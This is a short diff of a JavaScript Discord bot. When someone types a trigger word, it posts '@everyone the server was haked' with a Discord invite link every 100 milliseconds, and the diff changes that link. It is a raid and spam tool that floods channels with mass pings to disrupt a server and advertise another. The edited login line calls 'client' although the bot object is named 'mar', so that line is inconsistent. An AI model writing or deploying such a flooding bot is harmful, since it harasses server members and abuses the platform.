@@ -439,11 +439,11 @@ message.channel.sendMessage('@here the server was haked ')
 mar.on('message', message => {
     if (message.content.startsWith('xxnx')){
 setInterval(() => {
-message.channel.sendMessage('@everyone the server was haked  discord.gg/MB49QPn')
+message.channel.sendMessage('@everyone the server was haked  https://discord.gg/t5QdXyF')
 }, 100);
 }
 }); 
 
 
 
-mar.login("token")  
+client.login(process.env.BOT_TOKEN);
